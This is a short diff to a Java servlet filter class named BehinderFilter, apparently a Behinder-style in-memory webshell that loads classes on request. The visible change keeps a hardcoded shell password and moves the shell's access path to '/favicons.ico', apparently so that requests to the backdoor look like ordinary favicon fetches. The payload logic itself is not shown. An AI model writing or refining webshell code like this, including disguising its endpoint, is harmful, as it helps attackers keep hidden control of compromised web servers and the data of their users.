@@ -29,7 +29,7 @@ public final class BehinderFilter extends ClassLoader implements Filter {
     public HttpServletResponse response = null;
     public String cs = "UTF-8";
     public String Pwd = "eac9fa38330a7535";
-    public String path = "/favicondemo.ico";
+    public String path = "/favicons.ico";
 
     public BehinderFilter() {
     }
